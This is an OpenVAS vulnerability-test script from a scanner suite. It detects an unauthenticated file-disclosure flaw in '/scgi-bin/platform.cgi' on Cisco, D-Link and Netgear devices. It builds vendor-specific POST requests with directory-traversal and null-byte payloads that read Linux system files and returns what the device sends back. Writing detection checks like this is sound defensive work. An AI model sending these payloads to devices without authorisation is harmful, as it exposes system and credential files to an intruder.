###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_devices_platform_cgi_lfi_01_16.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Multiple Devices '/scgi-bin/platform.cgi' Unauthenticated File Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105500");
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("Multiple Devices '/scgi-bin/platform.cgi' Unauthenticated File Disclosure");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39184/");

  script_tag(name:"impact", value:"An attacker could exploit this vulnerability to read arbitrary files on the device. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote device is prone to an arbitrary file-disclosure vulnerability because it fails to adequately validate user-supplied input.");

  script_tag(name:"affected", value:"Devices from Cisco, D-Link and Netgear.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2016-01-07 15:24:11 +0100 (Thu, 07 Jan 2016)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("Embedded_HTTP_Server/banner");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:443 );

banner = get_http_banner( port:port );
if( ! banner || "Server: Embedded HTTP Server" >!< banner )
  exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

url = '/scgi-bin/platform.cgi';
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( !buf || buf !~ "^HTTP/1\.[01] 200" )
  exit( 0 );

if( "netgear" >< tolower( buf ) )
  typ = 'netgear';
else if( "d-link" >< tolower( buf ) || "dlink" >< tolower( buf ) )
  typ = 'dlink';
else
  typ = 'cisco';

vtstrings = get_vt_strings();
vtstring = vtstrings["default"];
vtstring_lower = vtstrings["lowercase"];

files = traversal_files("linux");

foreach pattern( keys( files ) ) {

  file = files[pattern];

  if( typ == "cisco" )
    data = 'button.login.home=Se%20connecter&Login.userAgent=' + vtstring_lower + '&reload=0&SSLVPNUser.Password=' + vtstring_lower + '&SSLVPNUser.UserName=' + vtstring_lower + '&thispage=../../../../../../../../../../' + file + '%00.htm';
  else if( typ == "dlink" )
    data = 'thispage=../../../../../../../../../../' + file + '%00.htm&Users.UserName=admin&Users.Password=' + vtstring_lower + '&button.login.Users.deviceStatus=Login&Login.userAgent=' + vtstring;
  else if( typ == "netgear" )
    data = 'thispage=../../../../../../../../../../' + file + '%00.htm&USERDBUsers.UserName=admin&USERDBUsers.Password=' + vtstring_lower + '&USERDBDomains.Domainname=geardomain&button.login.USERDBUsers.router_status=Login&Login.userAgent=' + vtstring;

  len = strlen( data );

  req = 'POST /scgi-bin/platform.cgi HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: */*\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        data;
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ "^HTTP/1\.[01] 200" && egrep( string:buf, pattern:pattern ) ) {
    report = 'By sending a special crafted POST request to "/scgi-bin/platform.cgi" it was possible to read the file "/' + file + '".\nThe following response was received:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );